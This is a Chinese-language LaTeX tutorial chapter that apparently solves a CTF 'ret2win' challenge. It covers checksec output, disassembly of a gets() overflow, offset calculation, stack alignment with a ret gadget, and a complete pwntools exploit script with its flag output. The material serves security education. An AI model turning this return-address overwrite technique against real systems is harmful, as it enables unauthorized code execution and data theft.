\section{第一題：ret2win}
\label{chap:ret2win}

這是五題裡最簡單的一題，也是唯一一題你可以「純靠第二章的圖」就打完的。
它的名字 ret2win 就是字面意思：\textbf{return to win}——把 return address 改成 \code{win()}。

\subsection{題目給了什麼}

壓縮檔解出來是一個執行檔（本講義放在 \file{work/ret2win/main.out}）與一個 \file{flag.txt}。
先看防禦機制：

\begin{lstlisting}[style=raw]
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
\end{lstlisting}

\begin{keybox}[這四行直接決定打法]
\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
  \item \textbf{No canary} $\Rightarrow$ 可以放心 overflow，蓋掉 return address 不會被檢查。
  \item \textbf{No PIE} $\Rightarrow$ 程式碼位址是固定的（\code{0x400000} 起算），
        你可以\textbf{直接把寫死的位址}填進 payload，不需要先 leak。
  \item NX enabled $\Rightarrow$ 不能放 shellcode。但這題也不需要——目標函式就在程式裡。
\end{itemize}
\end{keybox}

\subsection{逆一下：程式只有三件事}

\begin{lstlisting}[style=asm]
00000000004012f0 <main>:
  4012fd:  call   4011f6 <hello>
\end{lstlisting}

\code{main} 什麼都沒做，只呼叫 \code{hello}。而 \code{hello} 是這樣：

\begin{lstlisting}[style=asm]
00000000004011f6 <hello>:
  4011f6:  endbr64
  4011fa:  push   rbp
  4011fb:  mov    rbp,rsp
  4011fe:  sub    rsp,0x10
  401202:  lea    rax,[rip+0xdff]        # 402008  "Hi, what's your name?"
  40120c:  call   4010a0 <puts@plt>
  401220:  lea    rax,[rbp-0xa]          ; <=== buffer 在這裡！
  401224:  mov    rdi,rax
  40122c:  call   4010d0 <gets@plt>      ; <=== 不限長度的輸入
  401231:  lea    rax,[rbp-0xa]
  401242:  call   4010b0 <printf@plt>    ; printf("Hello, %s!", buf)
  40125c:  leave
  40125d:  ret
\end{lstlisting}

看到 \code{gets} 就等於看到「這題可以溢位」。\code{gets} 沒有長度上限，
你送多少它就寫多少，而它就寫在 \code{rbp-0xa} 這個只有 10 bytes 的地方。

再來找「目標」。程式裡有一個從來沒被呼叫的函式：

\begin{lstlisting}[style=asm]
000000000040125e <win>:
  40126a:  lea    rax,[rip+0xdb9]   # "r"        -> 40202a
  401274:  lea    rax,[rip+0xdb1]   # "flag.txt" -> 40202c
  40127e:  call   4010f0 <fopen@plt>            ; fopen("flag.txt", "r")
  4012ab:  lea    rax,[rbp-0x50]
  4012b4:  mov    rdi,rax
  4012b7:  call   4010c0 <fgets@plt>            ; fgets(buf, 0x40, fp)
  4012c3:  lea    rax,[rip+0xdb7]   # "Hello, %s!" 之類的格式
  4012d2:  call   4010b0 <printf@plt>           ; 印出 flag
\end{lstlisting}

\begin{keybox}[一句話定義 ret2win]
「目標函式已經寫好在程式裡了，我只要讓 \code{rip} 跳過去就好。」
不需要 shellcode、不需要 leak、不需要 ROP——所以它是最適合入門的一題。
\end{keybox}

\subsection{三個關鍵數字}

\begin{longtable}{@{}p{4.2cm}p{10.8cm}@{}}
\toprule
\textbf{數字} & \textbf{怎麼來的}\\
\midrule
\endhead
\code{win = 0x40125e} &
  符號表直接查（\code{ELF(BIN).symbols['win']}），No PIE 所以就是最終位址。\\
\code{buffer = 0xa} &
  \code{lea rax,[rbp-0xa]}：從 \code{rbp} 往回算 10 bytes。\\
\code{offset = 0x12} &
  \code{buffer + 8} $= 0xa + 8 = 18$。那個 8 是 saved \code{rbp}（第二章的公式）。\\
\bottomrule
\end{longtable}

\subsection{offset 為什麼是 buffer + 8}

回憶第二章那張圖：\code{gets} 從 \code{rbp-0xa} 開始往\textbf{高位址}寫。
所以它依序會蓋到：

\[
\underbrace{\text{buf[0..9]}}_{10\ \text{bytes}}
\quad\underbrace{\text{saved rbp}}_{8\ \text{bytes}}
\quad\underbrace{\text{return address}}_{8\ \text{bytes}}
\]

你要「碰得到」return address，就必須先填滿 10 bytes 的 buffer，再填滿 8 bytes 的 saved rbp，
總共 $10 + 8 = 18$ bytes 之後，才是 return address 的起點。

\begin{warnbox}[最常見的兩個錯]
\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
  \item 只填 10 bytes 就接位址 $\Rightarrow$ 你的位址只蓋到 saved rbp，程式「正常」返回，什麼都沒發生。
  \item 忘記算 buffer 之外還有別的區域變數 $\Rightarrow$ offset 偏小。
        這題很單純（只有一個 buffer），但後面幾題會有陣列＋索引，要更小心。
\end{itemize}
\end{warnbox}

\subsection{組出 payload}

\begin{lstlisting}[style=py]
OFFSET = 0xa + 8            # 18
payload  = b'A' * OFFSET    # 填滿 buffer + saved rbp
payload += p64(RET)         # 對齊用的 ret（下一節解釋）
payload += p64(WIN)         # win() 的位址，會被 ret 彈進 rip
\end{lstlisting}

\code{p64()} 把一個 64-bit 整數打包成 8 bytes 小端序。
小端序的意思是 \code{0x40125e} 在記憶體裡長這樣：\code{5e 12 40 00 00 00 00 00}。

\subsection{那個多出來的 ret 是幹什麼的}

這是很多人第一次寫 ROP 會踩的坑，先講結論：

\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
  \item x86-64 的 System V ABI 規定：\textbf{執行 \code{call} 之前，\code{rsp} 必須是 16 的倍數}。
  \item 有些 libc 函式（例如 \code{system}、\code{printf} 在某些路徑）會用 SSE 指令
        \code{movaps} 把資料搬到 16-byte 對齊的位置；\code{rsp} 沒對齊就直接 SIGSEGV。
  \item 插一個「只有 \code{ret} 一個指令」的 gadget，等於把 \code{rsp} \textbf{多推 8 bytes}，
        用來微調對齊。
\end{itemize}

\begin{warnbox}[誠實說明：這題其實加不加都會過]
我實測過這題與下一題（weakness），\textbf{加不加那個 \code{ret} 都拿得到 flag}：

\begin{lstlisting}[style=raw]
ret2win :  no ret -> FLAG OK     +ret -> FLAG OK
weakness:  no ret -> FLAG OK     +ret -> FLAG OK
\end{lstlisting}

原因是這兩題的 \code{win()} 只呼叫 \code{fopen}/\code{fgets}/\code{printf}，
在題目使用的 glibc 版本下這幾個函式不會因為 \code{rsp} 差 8 bytes 就爆掉。
\textbf{但這是運氣，不是通則。}第 \ref{chap:rop} 章我會做一個\textbf{真的會爆}的示範，
讓你親眼看到「只差一個 \code{ret} 就 SIGSEGV」。
所以在真實比賽裡，看到 chain 爆掉而位址明明正確時，第一個要懷疑的就是對齊。
\end{warnbox}

\subsection{完整腳本}

\begin{lstlisting}[style=py]
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

BIN = '/home/kzzz/Documents/code/ctf/ctf7/pwn/work/ret2win/main.out'
elf = ELF(BIN, checksec=False)

WIN = elf.symbols['win']        # 0x40125e
RET = 0x40101a                  # 一個孤立的 `ret` 指令，用來對齊

OFFSET = 0xa + 8                # buf[10] + saved rbp = 18

payload  = b'A' * OFFSET
payload += p64(RET)
payload += p64(WIN)

io = process(BIN, cwd=os.path.dirname(BIN))    # cwd 要在題目目錄，才找得到 flag.txt
io.sendlineafter(b'name?\n', payload)
print(io.recvall(timeout=2).decode(errors='replace'))
\end{lstlisting}

\begin{keybox}[\code{cwd} 與 \code{RET} 的來源]
\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
  \item \code{process(BIN, cwd=...)}：flag 是 \code{./flag.txt}，工作目錄不對就 \code{cat} 不到。
  \item \code{RET = 0x40101a}：這是從 \code{objdump} 裡挑一個「\code{c3} 前面沒有別的雜訊」的位置，
        最方便的做法是找 \code{__libc_csu_init} 附近的 \code{ret}，或用 \code{ROPgadget --only "ret"}。
        這題剛好 \code{40101a: c3  ret}。
\end{itemize}
\end{keybox}

\subsection{執行結果}

\begin{lstlisting}[style=raw]
[+] Starting local process '.../work/ret2win/main.out': pid 1788470
Hello, AAAAAAAAAAAAAAAAAA@!
OWASP{local_test_flag_ret2win}
\end{lstlisting}

（\code{Hello, AAAA...@!} 裡那個 \code{@} 就是你 \code{ret} 位址的第一個 byte \code{0x1a}
被 \code{printf("\%s")} 印出來的殘骸——因為 \code{gets} 之後程式還是先做了一次
\code{printf("Hello, \%s!")}，那時你的 payload 已經蓋上去了。）

\begin{keybox}[這題你要帶走的三件事]
\begin{enumerate}[leftmargin=1.4em,itemsep=1pt]
  \item \textbf{offset $=$ buffer 大小 $+$ 8}（saved rbp）。看組語的 \code{lea rax,[rbp-0x??]} 最準。
  \item \textbf{No PIE} 才能直接寫死位址；有 PIE 就得先 leak（第 \ref{chap:vault} 章）。
  \item \textbf{「目標函式在程式裡」} 是 ret2win 的前提。如果 flag 只能靠 \code{system("/bin/sh")} 拿，
        你就需要 \textbf{ROP}——下一章。
\end{enumerate}
\end{keybox}
